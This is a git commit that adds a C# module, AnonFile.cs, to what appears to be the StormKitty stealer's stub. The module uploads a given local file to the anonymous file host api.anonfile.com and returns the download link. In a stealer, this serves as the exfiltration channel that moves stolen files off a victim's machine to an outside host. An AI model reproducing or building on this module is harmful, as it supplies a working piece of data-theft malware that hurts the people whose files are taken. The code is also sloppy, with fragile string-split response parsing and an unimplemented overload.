af2239c6147d9be20950cebd281d104d065d5990
bletblab <72196167+bletblab@users.noreply.github.com>
2020-10-01 14:23:41 +0300

    Initial commit

---
+++ StormKitty/stub/Neko/Modules/Manager/AnonFile.cs
@@ -0,0 +1,51 @@
+﻿using System;
+using System.Windows.Forms;
+using System.Net;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
+
+namespace StormKitty
+{
+    internal sealed class AnonFiles
+    {
+   
+         public static string CreateDownloadLink(string file, bool v)
+        {
+                string ReturnValue = string.Empty;
+                try
+                {
+                    using (WebClient Client = new WebClient())
+                    {
+                    
+                    byte[] Response = Client.UploadFile("https://api.anonfile.com/upload", file);
+                        string ResponseBody = Encoding.ASCII.GetString(Response);
+                  //  string ResponseBody = System.Text.Encoding.UTF8.GetString(Response);
+                    if (ResponseBody.Contains("\"error\": {"))
+                        {
+                            ReturnValue += "There was a erorr while uploading the file.\r\n";
+                            ReturnValue += "Error message: " + ResponseBody.Split('"')[7] + "\r\n";
+                        }
+                        else
+                        {
+                            ReturnValue += "Download link: " + ResponseBody.Split('"')[15] + "\r\n";
+                            ReturnValue += "File name: " + ResponseBody.Split('"')[25] + "\r\n";
+                        }
+                    }
+                }
+                catch (Exception Exception)
+                {
+                    ReturnValue += "Exception Message:\r\n" + Exception.Message + "\r\n";
+                }
+                return ReturnValue;
+            }
+
+       
+
+        internal static string CreateDownloadLink(string v)
+        {
+            throw new NotImplementedException();
+        }
+    }
+    }
+
